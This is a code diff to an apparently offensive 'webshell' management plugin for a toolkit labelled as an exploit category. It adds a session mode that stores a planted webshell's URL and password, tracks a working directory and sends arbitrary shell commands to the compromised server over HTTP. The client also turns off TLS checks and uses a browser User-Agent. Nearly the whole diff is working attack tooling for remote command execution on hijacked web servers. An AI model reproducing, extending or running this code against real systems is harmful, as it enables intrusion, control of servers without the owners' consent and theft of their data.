@@ -1,4 +1,4 @@
-"""WebShell 管理插件 v2.0.0 - 连接测试/命令执行/文件管理/数据库操作/Shell检测"""
+"""WebShell 管理插件 v2.1.0 - 会话模式 + 单次模式"""
 
 import base64
 from typing import Any, AsyncIterator
@@ -6,6 +6,7 @@ from typing import Any, AsyncIterator
 import httpx
 
 from netkitx_sdk import PluginBase, PluginEvent, PluginMeta
+from netkitx_sdk.base import SessionPlugin
 
 _MARKER = "NETKITX_OK"
 
@@ -24,20 +25,97 @@ _OP_LABELS = {
 }
 
 
-class WebShellPlugin(PluginBase):
-    """WebShell 管理插件"""
+class WebShellPlugin(SessionPlugin):
+    """WebShell 管理插件 — 支持会话模式"""
 
     meta = PluginMeta(
         name="webshell",
-        version="2.0.0",
+        version="2.1.0",
         description="WebShell 管理工具 - 连接测试/命令执行/文件管理/数据库操作/Shell检测",
         category="exploit",
         engine="python",
+        mode="session",
     )
 
     def __init__(self):
         super().__init__()
         self.client: httpx.AsyncClient | None = None
+
+    # ── session lifecycle ─────────────────────────────────────────────
+
+    async def on_session_start(self, params: dict[str, Any]) -> dict[str, Any]:
+        """Initialize session: validate connection and return initial state."""
+        url = params.get("url", "").strip()
+        password = params.get("password", "").strip()
+        shell_type = params.get("shell_type", "php_eval")
+        timeout = int(params.get("timeout", 15))
+
+        return {
+            "url": url,
+            "password": password,
+            "shell_type": shell_type,
+            "timeout": timeout,
+            "cwd": "/",
+        }
+
+    async def on_message(
+        self, session_id: str, message: dict[str, Any], state: dict[str, Any]
+    ) -> AsyncIterator[PluginEvent]:
+        """Handle a command within the session."""
+        command = message.get("command", "").strip()
+        if not command:
+            yield PluginEvent(type="error", data={"error": "命令不能为空"})
+            return
+
+        url = state["url"]
+        password = state["password"]
+        shell_type = state["shell_type"]
+        timeout = state.get("timeout", 15)
+        cwd = state.get("cwd", "/")
+
+        client = httpx.AsyncClient(
+            timeout=timeout,
+            verify=False,
+            follow_redirects=True,
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "*/*",
+            },
+        )
+
+        try:
+            # Handle cd command — update cwd in state
+            if command.startswith("cd "):
+                target = command[3:].strip()
+                if target.startswith("/"):
+                    new_cwd = target
+                else:
+                    new_cwd = f"{cwd.rstrip('/')}/{target}"
+                state["cwd"] = new_cwd
+                yield PluginEvent(type="result", data={"output": f"cd → {new_cwd}", "cwd": new_cwd})
+                return
+
+            # Prepend cwd to command
+            full_cmd = f"cd {cwd} && {command}" if cwd != "/" else command
+            payload = self._build_payload(shell_type, "exec", command=full_cmd)
+            resp = await client.post(url, data={password: payload})
+            output = resp.text.strip()
+
+            yield PluginEvent(
+                type="result",
+                data={"output": output if output else "(无输出)", "cwd": cwd},
+            )
+        except httpx.TimeoutException:
+            yield PluginEvent(type="error", data={"error": "连接超时"})
+        except httpx.ConnectError as e:
+            yield PluginEvent(type="error", data={"error": f"连接失败: {e}"})
+        except Exception as e:
+            yield PluginEvent(type="error", data={"error": f"执行失败: {e}"})
+        finally:
+            await client.aclose()
+
+    async def on_session_end(self, session_id: str, state: dict[str, Any]) -> None:
+        pass
 
     # ── execute ──────────────────────────────────────────────────────
 
